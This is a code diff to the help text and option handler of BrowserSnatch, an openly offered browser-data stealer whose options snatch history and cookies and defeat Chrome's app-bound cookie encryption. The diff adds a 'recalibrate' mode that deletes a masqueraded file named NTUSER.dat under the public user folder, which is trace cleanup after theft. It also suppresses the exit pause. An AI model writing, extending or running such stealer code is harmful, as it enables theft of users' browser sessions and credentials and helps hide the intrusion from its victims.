@@ -108,6 +108,7 @@ void Visualizer::displayHelp() {
     std::cout << "  -history -g                 Snatch history from Gecko browsers only\n";
     std::cout << "  -greed                      Snatch everything {including app-bound-encrypted cookies}\n";
     std::cout << "  -app-bound-decryption       Defeat latest app-bound-encryption\n";
+    std::cout << "  -recalibrate                Clean residue\n";
     std::cout << "For more details, visit: https://shaddy43.github.io\n";
 }
 
@@ -201,25 +202,44 @@ void Visualizer::handler(int option, std::string service_parameter)
     {
         //greed mode
         if (!greed_mode(converted_username, stealer_db))
-            std::cerr << "BrowserSnatch executed with {greed mode}: failed" << std::endl;
+            std::cerr << "BrowserSnatch executed with {greed mode}: failed\nPlease Recalibrate BrowserSnatch...\n\n" << std::endl;
     }
     else if (option == 14)
     {
         //app-bound-decryption
         std::cout << "Target App-Bound-Encrypted Cookies..." << std::endl;
         if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
-            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
+            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed\nPlease Recalibrate BrowserSnatch...\n\n" << std::endl;
 
         // Pause before exit
         std::cout << "DB PATH: " << stealer_db << std::endl;
-        std::cout << "\nPress any key to exit...";
-        std::cin.get();
+        //std::cout << "\nPress any key to exit...";
+        //std::cin.get();
     }
     else if (option == 15)
     {
         //app-bound-decryption
         if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, true, service_parameter))
             std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
+    }
+    else if (option == 16)
+    {
+        //recalibrating... cleanup service... deleting ntuser, masqueraded snatch browser binaries etc
+        //currently only ntuser
+        std::string output_file = "c:\\users";
+        output_file += "\\public\\";
+        output_file += "NTUSER.dat";
+
+        try {
+            if (std::filesystem::exists(output_file)) {
+                if (std::filesystem::remove(output_file)) {
+                    std::cout << "Recalibrate success\n";
+                }
+            }
+        }
+        catch (const std::filesystem::filesystem_error& e) {
+            
+        }
     }
     else
     {
